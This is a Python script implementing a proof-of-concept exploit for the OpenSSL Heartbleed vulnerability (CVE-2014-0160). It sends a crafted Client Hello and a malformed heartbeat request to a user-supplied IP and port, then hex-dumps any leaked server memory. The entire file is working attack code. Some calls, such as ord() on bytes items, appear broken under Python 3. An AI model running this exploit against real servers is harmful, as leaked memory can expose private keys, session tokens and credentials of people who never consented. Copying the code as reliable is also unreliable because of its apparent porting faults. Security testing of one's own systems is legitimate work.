#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import struct
import socket
import select
import textwrap
import binascii
import fire
from loguru import logger

class OpenSSLTLSHE(object):
	"""
	CVE: CVE-2014-0160 - OpenSSL TLS Heartbeat Extension - Multiple SSL/TLS versions - PoC
	Version: 1.0.1f
	Exploit Author: Csaba Fitzl

	Reference:
		https://www.exploit-db.com/exploits/32764
		http://www.openssl.org/
		http://www.openssl.org/source/openssl-1.0.1f.tar.gz
	"""
	def __init__(self, ip = '127.0.0.1', port = 443):
		"""
		Test for SSL heartbeat vulnerability

		Args:
			ip(str) : target ip address (default is 127.0.0.1)
			port(int) : TCP port to test (default: 443)
		"""
		self.ip = ip
		self.port = port
		self.ssl_tls_versions = {
			"SSL 3.0": "03 00",
			"TLS 1.0": "03 01",
			"TLS 1.1": "03 02",
			"TLS 1.2": "03 03"
		}
	def hex2bin(self, data):
		hex_str = data.replace(' ', '').replace('\n', '')
		bin_data = binascii.unhexlify(hex_str)
		return bin_data
	
	def create_hello(self, version):
		data = textwrap.dedent(f"""\
			16 {version} 00 dc 01 00 00  d8 {version} 53
			43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
			bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
			00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
			00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
			c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
			c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
			c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
			c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
			00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
			03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
			00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
			00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
			00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
			00 0f 00 01 01""")
		hello = self.hex2bin(data)
		return hello

	def receive_all(self, sock, remain, rtime = 5):
		rdata = bytearray()
		while remain > 0:
			if rtime < 0:
				return None
			rlist, _, _ = select.select([sock], [], [], rtime)
			if sock in rlist:
				data = sock.recv(remain)
				if not data:
					return None
				rdata += data
				remain -= len(data)
		return bytes(rdata)

	def receive_message(self, sock):
		buffer = self.receive_all(sock, 5)
		if buffer is None:
			logger.info(f"Unexpected EOF receiving record header - server closed connection")
			return None, None, None
		type, version, length = struct.unpack('>BHH', buffer)
		payload = self.receive_all(sock, length, 10)
		if payload is None:
			logger.info(f"Unexpected EOF receiving record payload - server closed connection")
			return None, None, None
		logger.info(f"Received message: type = {type}, version = {version}, length = {len(payload)}")
		return type, version, payload

	def hexdump(self, payload):
		for b in range(0, len(payload), 16):
			lin = payload[b : b + 16]
			hxdat = ' '.join('%02X' % ord(c) for c in lin)
			pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
			logger.info(f"  {b:04x}: {hxdat:48s} {pdat}")

	def hit_hb(self, sock, hb):
		sock.send(hb)
		while True:
			type, _, payload = self.receive_message(sock)
			if type is None:
				logger.info(f"No heartbeat response received, server likely not vulnerable")
				return False
			elif type == 24:
				logger.info(f"Received heartbeat response:")
				self.hexdump(payload)
				if len(payload) > 3:
					logger.info(f"WARNING: server returned more data than it should - server is vulnerable!")
				else:
					logger.info(f"Server processed malformed heartbeat, but did not return any extra data.")
				return True
			elif type == 21:
				logger.info(f"Received alert:")
				self.hexdump(payload)
				logger.info(f"Server returned error, likely not vulnerable")
				return False

	def openssl_tls_heartbeat_extension_poc(self):
		for key, version in self.ssl_tls_versions.items():
			logger.info(f"Trying {key} ...")
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
				logger.info(f"Connecting ...")
				sock.connect((self.ip, self.port))
				logger.info(f"Sending Client Hello ...")
				sock.send(self.create_hello(version))
				logger.info(f"Waiting for Server Hello ...")
				while True:
					type, _, payload = self.receive_message(sock)
					if type == None:
						logger.info(f"Server closed connection without sending Server Hello.")
						return None
					if type == 22 and ord(payload[0]) == 0x0E:
						break
				logger.info(f"Sending heartbeat request ...")
				hb = self.hex2bin(f"18 {version} 00 03 01 40 00")
				sock.send(hb)
				if self.hit_hb(sock, hb):
					break

	def main(self):
		self.openssl_tls_heartbeat_extension_poc()
		
if __name__ == '__main__':
	fire.Fire(OpenSSLTLSHE)

